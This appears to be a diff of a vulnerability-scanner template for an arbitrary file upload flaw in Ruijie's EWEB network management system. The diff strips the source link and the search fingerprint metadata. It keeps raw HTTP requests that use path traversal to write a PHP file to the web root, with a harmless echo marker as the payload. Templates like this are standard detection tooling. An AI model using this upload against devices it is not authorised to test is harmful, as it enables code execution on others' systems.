@@ -3,12 +3,8 @@ info:
   name: 锐捷uploadAction存在任意文件文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/udrvwo3bzkl823yg'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: udrvwo3bzkl823yg
-    fofa: title=”锐捷网络-EWEB网管系统"
 http:
 - raw:
   - 'POST /ddi/server/login.php HTTP/1.1
@@ -63,7 +59,6 @@ http:
     Connection: keep-alive
 
     fileName=../tmp/html/test.php&mes=<?php echo 123321;?>
-
 
 
     文件定位：'
